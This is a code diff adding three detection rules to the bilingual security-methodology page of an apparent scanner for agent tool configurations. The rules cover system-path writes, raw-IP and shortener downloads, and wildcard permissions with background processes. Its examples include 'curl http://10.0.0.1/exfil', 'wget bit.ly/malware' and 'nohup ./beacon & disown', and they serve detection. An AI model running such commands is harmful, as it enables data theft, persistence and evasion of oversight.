@@ -161,6 +161,42 @@ const SecurityMethodology = () => {
       ],
       severity: "critical",
     },
+    {
+      icon: ShieldAlert,
+      title: isEs ? "14. Escrituras en directorios de sistema" : "14. System Directory Writes",
+      description: isEs
+        ? "Detectamos intentos de escribir en rutas del sistema (/usr/local/, /etc/, /opt/) y archivos dotfile del home (~/.bashrc, ~/.profile). Común en ataques de persistencia."
+        : "We detect attempts to write to system paths (/usr/local/, /etc/, /opt/) and home dotfiles (~/.bashrc, ~/.profile). Common in persistence attacks.",
+      examples: [
+        { label: "BLOCKED", code: "cp malware /usr/local/bin/ → ❌" },
+        { label: "BLOCKED", code: "echo 'alias' >> ~/.bashrc → ❌" },
+      ],
+      severity: "critical",
+    },
+    {
+      icon: ShieldAlert,
+      title: isEs ? "15. Red: IPs y URL shorteners" : "15. Raw IPs & URL Shorteners",
+      description: isEs
+        ? "Detectamos conexiones a IPs directas (http://192.168.x.x) que evaden DNS, y enlaces acortados (bit.ly, tinyurl, t.co) que ocultan el destino real."
+        : "We detect connections to raw IP addresses (http://192.168.x.x) that bypass DNS, and shortened URLs (bit.ly, tinyurl, t.co) that hide the real destination.",
+      examples: [
+        { label: isEs ? "IP directa" : "Raw IP", code: "curl http://10.0.0.1/exfil → ⚠️" },
+        { label: "Shortener", code: "wget bit.ly/malware → ⚠️" },
+      ],
+      severity: "high",
+    },
+    {
+      icon: ShieldAlert,
+      title: isEs ? "16. Permisos amplios y procesos en segundo plano" : "16. Broad Permissions & Background Processes",
+      description: isEs
+        ? "Detectamos permisos excesivamente amplios (Bash(*), allowed-tools: [\"*\"]) y procesos en segundo plano (nohup, disown, setsid) que pueden persistir después de la sesión."
+        : "We detect overly broad permissions (Bash(*), allowed-tools: [\"*\"]) and background processes (nohup, disown, setsid) that can persist after the session ends.",
+      examples: [
+        { label: "BLOCKED", code: 'allowed-tools: ["*"] → ❌' },
+        { label: isEs ? "Segundo plano" : "Background", code: "nohup ./beacon & disown → ⚠️" },
+      ],
+      severity: "critical",
+    },
   ];
 
   const severityColors: Record<string, string> = {
